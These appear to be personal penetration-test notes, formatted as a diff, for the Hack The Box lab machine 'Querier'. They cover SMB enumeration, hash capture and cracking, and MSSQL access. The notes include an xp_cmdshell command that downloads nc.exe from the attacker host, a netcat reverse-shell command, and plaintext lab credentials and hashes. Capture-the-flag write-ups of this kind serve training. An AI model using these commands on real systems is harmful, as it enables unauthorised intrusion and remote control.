@@ -1,0 +1,218 @@
+OS: 
+
+Web-Technology: 
+
+Hostname: Querier
+
+IP: 10.10.10.125
+
+Credentials: 
+
+luis: unknow usersmb
+
+reporting:PcwTWTHRwryjc$c6 —> MSSQL
+
+querier:corporate568
+
+================================================================To-Try List
+
+## 139/445 -SMB
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+    Reports         Disk
+
+Download Currency Reports.xsml
+
+unzipped it and did a strings command on the VBa.bin
+
+revealed password. 
+
+luis —username was the author of hte book
+
+## 1433 - Microsoft SQL Server 2017 14.00.1000.00
+
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-info:
+|   10.10.10.125:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   10.10.10.125:1433:
+|     Target_Name: HTB
+|     NetBIOS_Domain_Name: HTB
+|     NetBIOS_Computer_Name: QUERIER
+|     DNS_Domain_Name: HTB.LOCAL
+|     DNS_Computer_Name: QUERIER.HTB.LOCAL
+|     DNS_Tree_Name: HTB.LOCAL
+|_    Product_Version: 10.0.17763
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/a2f9073d-8b92-4973-b9e1-686460d718a5/Untitled.png)
+
+Used Impacket SMBserver to capture hash. 
+
+Captured hash by using responder and setting up smbserver
+
+SMB relay ..
+
+└─$ sudo impacket-smbserver share ./ -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.125,49675)
+[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
+[*] User QUERIER\mssql-svc authenticated successfully
+[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:ae5d2671a1304e33c9fcc9e3c7b0d07a:01010000000000008025977013ebd9018203e39ab13f55e800000000010010005700780068007a0069004e0072005600030010005700780068007a0069004e0072005600020010004b00580065006a006e00420079005900040010004b00580065006a006e00420079005900070008008025977013ebd90106000400020000000800300030000000000000000000000000300000dbd1d4b47db33d98fccbe321a93d4cbeba78cc69c47f2d623c4d28f77a8a20930a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003800000000000000000000000000
+
+Cracked hash with hashcat
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/386536ec-8ab5-4bdd-8df3-947c3bb45324/Untitled.png)
+
+Logged into MSSQL service as mssql-svc - elevated perms. looking to elevate perms again. 
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/1d427a6c-3269-42d2-85e5-c8643858e501/Untitled.png)
+
+From service acocutn level, , we used the xp_cmdshell to perfrom RCE. We hosted a file via python web service and pulled down nc.exe from it. using 
+
+`SQL> xp_cmdshell powershell-c Invoke-WebRequest "http://10.10.16.8/nc.exe" -OutFile "C:\Reports\nc.exe"`
+
+we then executed nc.exe and got a revshell—>
+
+`xp_cmdshell C:\Reports\nc.exe 10.10.16.8 5560 -e cmd.exe`
+
+[USed the rev shell todonwload and execute a ps1 script from attacker machine. ](https://www.notion.so/USed-the-rev-shell-todonwload-and-execute-a-ps1-script-from-attacker-machine-61bab228c55a452786e9f139d935fa96?pvs=21)
+
+Once we had revshell. WE hosted powerup.ps1 on port 80 and then pulled it over and executed in ram. 
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/36031c34-ab27-40bf-b845-3a1c8d0ab29f/Untitled.png)
+
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group
+Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+Check     : Cached GPP Files
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/c5c0ad1d-89a6-498f-a823-75b37788578e/Untitled.png)
+
+5985 - 
+
+================================================================
+
+NMAP Resuslts 
+
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-info:
+|   10.10.10.125:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-09-18T22:51:12
+| Not valid after:  2053-09-18T22:51:12
+| MD5:   c954:9f72:695b:7066:ab02:c083:1d9a:eadc
+|*SHA-1: fb54:f9f2:38e3:50d5:e9ab:535a:4451:4299:5f72:ad5f
+| ms-sql-ntlm-info:
+|   10.10.10.125:1433:
+|     Target_Name: HTB
+|     NetBIOS_Domain_Name: HTB
+|     NetBIOS_Computer_Name: QUERIER
+|     DNS_Domain_Name: HTB.LOCAL
+|     DNS_Computer_Name: QUERIER.HTB.LOCAL
+|     DNS_Tree_Name: HTB.LOCAL
+|*    Product_Version: 10.0.17763
+|_ssl-date: 2023-09-18T22:54:22+00:00; +2s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94%E=4%D=9/18%OT=135%CT=1%CU=34074%PV=Y%DS=2%DC=I%G=Y%TM=6508D5
+OS:1C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=
+OS:104%GCD=1%ISR=109%TI=I%CI=I%II=I%TS=U)SEQ(SP=104%GCD=1%ISR=109%TI=I%CI=I
+OS:%II=I%SS=S%TS=U)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS
+OS:%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
+OS:=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
+OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
+OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
+OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
+OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
+OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
+OS:DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2023-09-18T22:54:14
+|_  start_date: N/A
+|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+
+NSE: Script Post-scanning.
+Initiating NSE at 17:54
+Completed NSE at 17:54, 0.00s elapsed
+Initiating NSE at 17:54
+Completed NSE at 17:54, 0.00s elapsed
+Initiating NSE at 17:54
+Completed NSE at 17:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.99 seconds
+Raw packets sent: 65831 (2.900MB) | Rcvd: 65645 (2.629MB)
+
+================================================================
+
+Web-Service Escalation
+
+================================================================
+
+Other / PRiviledge Escalaiton
+
+=============================================================
